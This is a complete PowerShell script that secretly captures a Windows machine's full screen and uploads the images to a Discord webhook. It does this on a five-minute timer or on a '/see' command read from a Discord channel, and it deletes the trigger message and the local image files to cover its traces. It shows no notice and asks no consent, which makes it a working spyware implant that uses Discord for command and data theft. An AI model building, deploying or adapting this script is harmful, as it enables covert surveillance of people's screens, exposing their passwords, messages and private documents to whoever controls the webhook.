$Config = @{
    WebhookUrl  = '__WEBHOOK__'
    BotToken    = '__TOKEN__'
    ChannelId   = '__CHANNEL__'
    IntervalSec = 300
    PollSec     = 3
}

$LogPath = Join-Path $env:TEMP 'screenagent.log'
function Log([string]$Message) {
    '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message |
        Add-Content -Path $LogPath -ErrorAction SilentlyContinue
}
if (-not $Config.WebhookUrl -or $Config.WebhookUrl -eq '__WEBHOOK__') { Log 'not configured'; exit 1 }

Log "agent start bot=$([bool]$Config.BotToken) channel=$($Config.ChannelId)"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Capture-Screen {
    $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    try {
        $g.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bmp.Size)
        $path = Join-Path $env:TEMP ("screen_{0}.png" -f [DateTime]::Now.ToString('yyyyMMdd_HHmmss_fff'))
        $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        return $path
    }
    finally { $g.Dispose(); $bmp.Dispose() }
}

function Send-Screenshot {
    $file = $null
    try {
        $file = Capture-Screen
        $client = New-Object System.Net.Http.HttpClient
        try {
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $stream = [System.IO.File]::OpenRead($file)
            try {
                $form.Add((New-Object System.Net.Http.StreamContent $stream), 'file', (Split-Path $file -Leaf))
                $form.Add((New-Object System.Net.Http.StringContent 'screen capture'), 'content')
                $resp = $client.PostAsync($Config.WebhookUrl, $form).Result
                if ($resp.IsSuccessStatusCode) { Log 'screenshot sent' }
                else {
                    Log "webhook failed: $([int]$resp.StatusCode)"
                    if ($resp.StatusCode -eq [System.Net.HttpStatusCode]::TooManyRequests) { Start-Sleep -Seconds 10 }
                }
            }
            finally { $stream.Dispose(); $form.Dispose() }
        }
        finally { $client.Dispose() }
    }
    catch { Log "send error: $($_.Exception.Message)" }
    finally { if ($file -and (Test-Path $file)) { Remove-Item $file -Force -ErrorAction SilentlyContinue } }
}

function Start-BotLoop {
    $head = @{ Authorization = "Bot $($Config.BotToken)" }
    $lastSeen = $null
    while ($true) {
        try {
            $uri = "https://discord.com/api/v10/channels/$($Config.ChannelId)/messages?limit=1"
            $msgs = Invoke-RestMethod -Uri $uri -Headers $head -ErrorAction Stop
            $m = @($msgs) | Select-Object -First 1
            if ($m -and $m.id -ne $lastSeen -and -not $m.author.bot -and $m.content -and ($m.content -match '^\s*/see\s*$')) {
                $lastSeen = $m.id
                Log "trigger /see from $($m.author.username)"
                Send-Screenshot
                try {
                    Invoke-RestMethod -Method Delete `
                        -Uri "https://discord.com/api/v10/channels/$($Config.ChannelId)/messages/$($m.id)" `
                        -Headers $head -ErrorAction Stop | Out-Null
                }
                catch { Log "delete failed: $($_.Exception.Message)" }
            }
        }
        catch { Log "poll error: $($_.Exception.Message)" }
        Start-Sleep -Seconds $Config.PollSec
    }
}

function Start-IntervalLoop {
    while ($true) {
        Send-Screenshot
        Start-Sleep -Seconds $Config.IntervalSec
    }
}

if ($Config.BotToken -and $Config.BotToken -ne '__TOKEN__' -and $Config.ChannelId) { Start-BotLoop } else { Start-IntervalLoop }
